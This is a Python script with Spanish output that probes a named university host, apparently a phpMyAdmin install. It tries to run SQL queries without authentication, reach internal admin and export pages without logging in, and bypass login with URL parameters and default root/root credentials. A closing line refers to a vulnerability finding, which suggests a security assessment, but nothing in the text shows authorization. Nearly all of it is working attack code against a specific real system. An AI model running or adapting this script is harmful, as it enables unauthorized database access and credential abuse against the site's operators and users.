#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
from urllib.parse import urlparse, quote
import re, sys, urllib3
urllib3.disable_warnings()

base_url = 'https://orcl.uns.edu.pe'
s = requests.Session()
s.verify = False
s.headers.update({'User-Agent': 'Mozilla/5.0'})

print("=" * 60)
print("TEST DE ACCESO SQL SIN AUTENTICACION")
print("=" * 60)

# Get token from index.php
r = s.get(f'{base_url}/index.php', timeout=5)
token_match = re.search(r'name="token" value="([^"]+)"', r.text)
tk = token_match.group(1) if token_match else 'NOT_FOUND'
print(f"Token CSRF: {tk}")
print(f"Cookies: {dict(s.cookies)}")

# Try /sql.php with token
print("\n--- Probando /sql.php con token ---")
queries = [
    "SELECT USER()",
    "SELECT DATABASE()", 
    "SELECT VERSION()",
    "SELECT CURRENT_USER()",
    "SELECT 1",
]

for q in queries:
    url = f"{base_url}/sql.php?server=1&sql_query={quote(q)}&token={tk}"
    try:
        resp = s.get(url, timeout=5)
        has_td = '<td' in resp.text
        has_error = 'error' in resp.text.lower() or 'error' in resp.text.lower()
        print(f"{q[:30]:30s} -> HTTP {resp.status_code} td={has_td} err={has_error}")
        if has_td and not has_error:
            tds = re.findall(r'<td[^>]*>([^<]+)</td>', resp.text)
            if tds: print(f"  -> Results: {tds[:5]}")
    except Exception as e:
        print(f"{q[:30]:30s} -> Error: {e}")

# Try /sql.php WITHOUT token
print("\n--- Probando /sql.php SIN token ---")
for q in queries[:2]:
    url = f"{base_url}/sql.php?server=1&sql_query={quote(q)}"
    try:
        resp = s.get(url, timeout=5)
        has_td = '<td' in resp.text
        has_error = 'error' in resp.text.lower()
        print(f"{q[:30]:30s} -> HTTP {resp.status_code} td={has_td} err={has_error}")
        if has_td and not has_error:
            tds = re.findall(r'<td[^>]*>([^<]+)</td>', resp.text)
            if tds: print(f"  -> Results: {tds[:5]}")
    except Exception as e:
        print(f"{q[:30]:30s} -> Error: {e}")

# Try internal pages
print("\n--- Probando paginas internas ---")
pages = [
    "/server_sql.php",
    "/db_sql.php?db=mysql",
    "/sql.php",
    "/tbl_sql.php",
    "/server_status.php",
    "/server_databases.php",
]

for page in pages:
    try:
        resp = s.get(f"{base_url}{page}", timeout=5)
        has_data = '<td' in resp.text
        has_login = 'login' in resp.text.lower()
        print(f"{page:30s} -> HTTP {resp.status_code} td={has_data} login_req={has_login}")
        if resp.status_code == 200 and not has_login and len(resp.text) > 100:
            tds = re.findall(r'<td[^>]*>([^<]+)</td>', resp.text)
            if tds: print(f"  -> DATA: {tds[:5]}")
    except Exception as e:
        print(f"{page:30s} -> Error: {e}")

# Try /export.php
print("\n--- Probando /export.php ---")
try:
    resp = s.get(f"{base_url}/export.php", timeout=5)
    print(f"/export.php -> HTTP {resp.status_code}, {len(resp.text)} bytes")
    if 'login' not in resp.text.lower() and len(resp.text) > 100:
        print("  ACCESIBLE SIN LOGIN!")
except Exception as e:
    print(f"Error: {e}")

# Try /navigation.php
print("\n--- Probando /navigation.php ---")
try:
    resp = s.get(f"{base_url}/navigation.php", timeout=5)
    print(f"/navigation.php -> HTTP {resp.status_code}, {len(resp.text)} bytes")
except Exception as e:
    print(f"Error: {e}")

# Try to check if there's a way to bypass login entirely
print("\n--- Probando bypass de login ---")
bypass_urls = [
    f"{base_url}/index.php?server=1&user=root&pass=",
    f"{base_url}/index.php?pma_username=root&pma_password=root",
    f"{base_url}/index.php?username=root&password=root&submit=Login",
    f"{base_url}/index.php?target=index.php&username=root&password=root",
]

for url in bypass_urls:
    try:
        resp = s.get(url, timeout=5, allow_redirects=True)
        has_logout = 'Logout' in resp.text
        has_login_form = 'login' in resp.text.lower() and 'logout' not in resp.text.lower()
        print(f"{url[:50]:50s} -> HTTP {resp.status_code} logout={has_logout} login_req={has_login_form}")
        if has_logout:
            print(f"  [!] ACCESO EXITOSO SIN CREDENCIALES VALIDAS!")
    except Exception as e:
        pass

# Try with POST login (different params)
print("\n--- Probando login POST con diferentes params ---")
login_variants = [
    {"username": "root", "password": "root", "target": f"{base_url}/index.php", "token": tk},
    {"pma_username": "root", "pma_password": "root", "server": "1"},
    {"username": "root", "pass": "root", "server": "1", "token": tk},
    {"user": "root", "password": "root", "server": "1", "token": tk},
    {"username": "root", "password": "root", "submit": "Login", "server": "1", "token": tk},
]

for payload in login_variants:
    try:
        resp = s.post(f"{base_url}/index.php", data=payload, timeout=5, allow_redirects=True)
        has_logout = 'Logout' in resp.text
        if has_logout:
            print(f"  [!] LOGIN EXITOSO con: {payload}")
            break
    except:
        pass

print("\n--- Resumen ---")
print("Si ningun metodo funciono, la autenticacion es necesaria para acceder a BD.")
print("La vulnerabilidad VULN-001 sigue siendo REAL por la exposicion de /setup/")
